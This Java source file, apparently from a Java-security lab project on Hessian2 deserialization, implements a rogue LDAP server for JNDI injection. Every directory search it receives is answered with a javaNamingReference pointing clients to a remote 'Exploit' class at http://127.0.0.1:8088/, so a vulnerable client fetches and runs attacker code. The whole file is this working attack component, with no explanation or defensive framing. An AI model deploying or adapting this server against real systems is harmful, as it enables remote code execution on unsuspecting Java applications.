package com.example.javasec.hessian2;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.text.MessageFormat;

public class LdapServer {
    private static final String javaCodeBase = "http://127.0.0.1:8088/";
    private static final String javaClassName = "Exploit";

    public static void main(String[] args) throws Exception {
        int port = 1389;
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new EvalInMemoryOperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    public static class EvalInMemoryOperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String baseDN = result.getRequest().getBaseDN();
            Entry e = new Entry(baseDN);

            e.addAttribute("javaClassName", javaClassName);
            e.addAttribute("javaFactory", javaClassName);
            e.addAttribute("javaCodeBase", javaCodeBase);
            e.addAttribute("objectClass", "javaNamingReference");

            System.out.println(MessageFormat.format("Send LDAP reference result for {0} redirecting to {1}{2}.class", baseDN, javaCodeBase, javaClassName));
            try {
                result.sendSearchEntry(e);
            } catch (LDAPException ex) {
                ex.printStackTrace();
            }
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}